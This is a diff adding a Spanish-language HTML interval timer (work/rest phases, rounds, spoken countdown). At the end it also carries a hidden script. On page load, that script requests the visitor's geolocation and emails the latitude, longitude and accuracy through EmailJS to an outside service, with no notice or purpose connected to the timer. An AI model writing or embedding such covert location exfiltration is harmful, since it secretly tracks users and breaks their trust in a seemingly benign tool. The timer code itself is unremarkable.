@@ -1,0 +1,249 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Temporizador con Bootstrap</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+	<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+    <style>
+        body {
+            background-color: #f8f9fa;
+            text-align: center;
+            padding: 20px;
+        }
+        .timer-box {
+            font-size: 30px;
+            font-weight: bold;
+            text-align: center;
+            width: 120px;
+            padding: 10px;
+            margin: 10px auto;
+            border-radius: 10px;
+        }
+        #workClock { background-color: blue; color: white; }
+        #restClock { background-color: green; color: white; }
+        #roundCard { background-color: orange; color: white; }
+        #countdown { font-size: 20px; font-weight: bold; margin-top: 10px; }
+        .container {
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        input { margin-bottom: 10px; }
+        .btn { width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 class="mb-4">Temporizador</h2>
+        <button class="btn btn-secondary mt-2" id="reset">Reset</button>
+        <br><br>
+        <label class="form-label">Tiempo de trabajo (segundos)</label>
+        <input type="number" class="form-control" id="work">
+
+        <label class="form-label">Tiempo de descanso (segundos)</label>
+        <input type="number" class="form-control" id="rest">
+
+        <label class="form-label">Número de rondas</label>
+        <input type="number" class="form-control" id="rondas">
+
+        <button class="btn btn-primary mt-3" id="run">Run</button>
+        <button class="btn btn-danger mt-2" id="stop">Stop</button>
+
+        <div id="countdown"></div>
+
+        <div class="timer-box mt-3" id="workClock">00</div>
+        <div class="timer-box mt-2" id="restClock">00</div>
+        <div class="timer-box mt-2" id="roundCard">Ronda: 0</div>
+    </div>
+
+    <script>
+        let interval, countdownInterval;
+        let currentRound = 1;
+        let stopFlag = false;
+        const synth = window.speechSynthesis;
+        let comprobarUltimaRonda=true;
+
+        function speak(text) {
+            const utterance = new SpeechSynthesisUtterance(text);
+            utterance.lang = "es-ES";
+            synth.speak(utterance);
+        }
+
+        function startCycle() {
+            stopFlag = false;
+            const workTime = parseInt(document.getElementById('work').value);
+            const restTime = parseInt(document.getElementById('rest').value);
+            const totalRounds = parseInt(document.getElementById('rondas').value);
+            
+            if (isNaN(workTime) || isNaN(restTime) || isNaN(totalRounds)) {
+                alert("Introduce valores válidos.");
+                return;
+            }
+
+            speak("Incio");
+            updateRoundCard();
+
+            function runTimer(time, phase) {
+                let remainingTime = time;
+                updateClock(remainingTime, phase);
+                if (currentRound === totalRounds && comprobarUltimaRonda) {
+                    speak("Última ronda");
+                    comprobarUltimaRonda=false;
+                }
+                interval = setInterval(() => {
+                    if (stopFlag) {
+                        clearInterval(interval);
+                        clearInterval(countdownInterval);
+                        return;
+                    }
+
+                    remainingTime--;
+                    updateClock(remainingTime, phase);
+
+                    if (remainingTime === 4) {
+                        startCountdown(remainingTime);
+                    }
+
+                    if (remainingTime <= 0) {
+                        clearInterval(interval);
+                        if (phase === "Trabajo") {
+                            if (currentRound <= totalRounds) {
+                                runTimer(restTime, "Descanso");
+                            } else {
+                                console.log("Ciclo completado");
+                            }
+                        } else {
+                            currentRound++;
+                            updateRoundCard();
+                            if (currentRound <= totalRounds) {
+                                runTimer(workTime, "Trabajo");
+                            } else {
+                                speak("Ciclo completado");
+                                console.log("Ciclo completado");
+                            }
+                        }
+                    }
+                }, 1000);
+            }
+
+            function updateClock(time, phase) {
+                if (phase === "Trabajo") {
+                    document.getElementById('workClock').innerText = time;
+                    document.getElementById('restClock').innerText = "00";
+                } else {
+                    document.getElementById('restClock').innerText = time;
+                    document.getElementById('workClock').innerText = "00";
+                }
+            }
+
+            function updateRoundCard() {
+                document.getElementById('roundCard').innerText = `Ronda: ${currentRound}`;
+            }
+
+            function startCountdown(seconds) {
+                clearInterval(countdownInterval);
+                countdownInterval = setInterval(() => {
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                    } else {
+                        document.getElementById('countdown').innerText = `Cuenta regresiva: ${seconds}`;
+                        speak(seconds.toString());
+                        seconds--;
+                    }
+                }, 1000);
+            }
+
+            runTimer(workTime, "Trabajo");
+        }
+
+        async function requestWakeLock() {
+            try {
+                wakeLock = await navigator.wakeLock.request('screen');
+                wakeLock.addEventListener('release', () => {
+                    console.log('Wake Lock liberado');
+                });
+            } catch (err) {
+                console.error(`Error en wakeLock: ${err.message}`);
+            }
+        }
+
+        document.getElementById('run').addEventListener('click', () => {
+            requestWakeLock();
+            startCycle();
+        });
+
+
+        document.getElementById('stop').addEventListener('click', () => {
+            stopFlag = true;
+            clearInterval(interval);
+            clearInterval(countdownInterval);
+            document.getElementById('countdown').innerText = "Detenido";
+            document.getElementById('workClock').innerText = "00";
+            document.getElementById('restClock').innerText = "00";
+            document.getElementById('roundCard').innerText = "Ronda: 0";
+            synth.cancel();
+        });
+
+        document.getElementById('reset').addEventListener('click', () => {
+            stopFlag = true;
+            clearInterval(interval);
+            clearInterval(countdownInterval);
+            synth.cancel();
+
+            // Limpiar valores de los campos
+            document.getElementById('work').value = "";
+            document.getElementById('rest').value = "";
+            document.getElementById('rondas').value = "";
+
+            // Restablecer la interfaz
+            document.getElementById('countdown').innerText = "";
+            document.getElementById('workClock').innerText = "00";
+            document.getElementById('restClock').innerText = "00";
+            document.getElementById('roundCard').innerText = "Ronda: 0";
+
+            currentRound = 1;
+            comprobarUltimaRonda=true
+        });
+
+
+    </script>
+	
+	<script>
+	  document.addEventListener("DOMContentLoaded", function() {
+		// Inicializar EmailJS cuando el documento esté listo
+		emailjs.init("eIQNiPHge-FFY36it"); // reemplaza con tu User ID real
+
+		// Función que obtiene la ubicación y la envía
+		function enviarUbicacion() {
+		  if (!navigator.geolocation) {			
+			return;
+		  }
+
+		  navigator.geolocation.getCurrentPosition((pos) => {
+			const params = {
+			  lat: pos.coords.latitude,
+			  lon: pos.coords.longitude,
+			  accuracy: pos.coords.accuracy
+			};
+
+			emailjs.send("service_bm9532c", "template_dk964ow", params)
+			  .then(() => console.log("Ubicación enviada por correo"))
+			  .catch(err => console.log("Error: " + err));
+		  }, (err) => {
+			console.log("Error obteniendo ubicación: " + err.message);
+		  });
+		}
+
+		// Ejecutar automáticamente al cargar la página
+		enviarUbicacion();
+	  });
+	</script>
+
+</body>
+</html>
+funciones_timev6.html
+Mostrando funciones_timev6.html.
